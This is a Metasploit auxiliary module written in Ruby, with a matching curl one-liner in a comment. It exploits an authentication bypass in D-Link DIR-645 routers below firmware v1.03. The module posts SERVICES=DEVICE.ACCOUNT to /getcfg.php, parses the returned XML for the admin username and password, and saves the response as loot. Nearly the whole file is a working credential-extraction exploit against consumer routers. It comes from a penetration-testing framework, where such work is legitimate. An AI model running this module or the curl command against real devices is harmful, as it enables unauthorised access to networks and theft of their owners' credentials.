##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'DLink DIR 645 Password Extractor',
			'Description' => %q{
				This module exploits an authentication bypass vulnerability in DIR 645 < v1.03.
				With this vulnerability you are able to extract the password for the remote management.
				},
			'References'  =>
				[
					[ 'URL', 'http://packetstormsecurity.com/files/120591/dlinkdir645-bypass.txt' ],
					[ 'BID', '58231' ],
					[ 'OSVDB', '90733' ]
				],
			'Author'      => [
				'Michael Messner <devnull@s3cur1ty.de>',	#metasploit module
				'Roberto Paleari <roberto@greyhats.it>'		#vulnerability discovery
			],
			'License'     => MSF_LICENSE
		)
	end

	def run_host(ip)

		vprint_status("#{rhost}:#{rport} - Trying to access the configuration of the device")

		#Curl request:
		#curl -d SERVICES=DEVICE.ACCOUNT http://192.168.178.200/getcfg.php | egrep "\<name|password"

		#download configuration
		begin
			res = send_request_cgi({
				'uri' => '/getcfg.php',
				'method' => 'POST',
				'headers' => {
						'Content-Type' => 'application/x-www-form-urlencoded',
						'Content-Length' => '23',
					},
				'vars_post' => {
					'SERVICES' => 'DEVICE.ACCOUNT'
					}
				})

			return if res.nil?
			return if (res.headers['Server'].nil? or res.headers['Server'] !~ /DIR-645 Ver 1.0/)
			return if (res.code == 404)

			#proof of response
			if res.body =~ /password/
				print_good("#{rhost}:#{rport} - credentials successfully extracted")
				vprint_status("#{res.body}")

				#store all details as loot -> there is lots of usefull stuff in the response
				loot = store_loot("account_details.txt","text/plain",rhost, res.body)
				vprint_good("#{rhost}:#{rport} - Account details downloaded to: #{loot}")

				res.body.each_line do |line|
					if line =~ /<password>/
						line = line.gsub(/<password>/,'')
						pass = line.gsub(/<\/password>/,'')
						vprint_good("pass: #{pass}")
					end
					if line =~ /<name>/
						line = line.gsub(/<name>/,'')
						user = line.gsub(/<\/name>/,'')
						vprint_good("user: #{user}")
					end
				end
			end

		rescue ::Rex::ConnectionError
			vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
			return
		end


	end
end
